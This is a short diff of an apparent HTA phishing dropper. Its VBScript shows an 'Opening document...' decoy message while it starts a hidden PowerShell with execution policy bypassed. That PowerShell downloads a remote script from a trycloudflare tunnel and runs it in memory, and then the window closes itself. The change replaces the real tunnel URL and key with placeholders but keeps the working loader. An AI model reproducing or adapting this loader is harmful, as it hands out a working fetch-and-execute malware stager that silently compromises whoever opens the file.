@@ -24,7 +24,7 @@ Sub RunIt
     document.getElementById("msg").innerText = "Opening document..."
     Dim c
     Set c = CreateObject("WScript.Shell")
-    c.Run "powershell -w hidden -ep bypass -c ""IEX(IWR 'https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/i5_syscall.ps1?key=57c36cda7fe1823797273b065ea3b8f8' -UseBasicParsing)""", 0, False
+    c.Run "powershell -w hidden -ep bypass -c ""IEX(IWR 'https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/i5_syscall.ps1?key=PLACEHOLDER_TOKEN' -UseBasicParsing)""", 0, False
     setTimeout "self.close", 1500
 End Sub
 </script>
